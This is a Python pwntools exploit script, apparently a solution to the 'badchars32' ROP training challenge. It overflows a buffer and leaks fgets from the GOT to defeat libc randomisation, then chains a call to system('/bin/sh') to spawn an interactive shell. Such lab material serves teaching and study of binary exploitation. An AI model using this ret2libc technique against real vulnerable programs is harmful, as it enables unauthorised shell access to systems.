#import pwntools
from pwn import *

#intialize the process
target=process('./badchars32')

#define the ELF
elf=ELF('./badchars32')

#get the libc used for the ELF
libc=elf.libc

# used for debugging
#context.terminal=["tmux","split","-h"]
#gdb.attach(target)

#print intial data
print(target.recvuntil("s\n> "))

#construct ROPchain

#intial payload
payload="A"*44

#gadgets,plt and got values
system_plt=0x080484e0
fgets_got=0x0804a018
puts_plt=0x080484d0
pr=0x0804889a
pwnme=0x80486b6

#leak address of fgets in randomized libc
payload+=p32(puts_plt)
payload+=p32(pr)
payload+=p32(fgets_got)

#return to pwnme
payload+=p32(pwnme)
payload+=p32(0x0)

#send payload
target.sendline(payload)

#recv data
leak=target.recv()

#get the leaked address
leak=leak[0:4]

#unpack the leak as a 32-bit address
libc_fgets=u32(leak+"\x00"*(4-len(leak)))

#get base address of libc
libc_base=libc_fgets-libc.symbols["fgets"]

#get address of "/bin/sh\x00" in libc
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()

#print the libc addresses
print(hex(libc_fgets))
print(hex(libc_base))
print(hex(libc_binsh))

#construct second ROPchain for the second phase

#initial payload
payload="A"*44

#call system("/bin/sh") with a bogus return address
payload+=p32(system_plt)
payload+=p32(0xdeadbeef)
payload+=p32(libc_binsh)

#send payload
target.sendline(payload)

#interact with the launched shell
target.interactive()
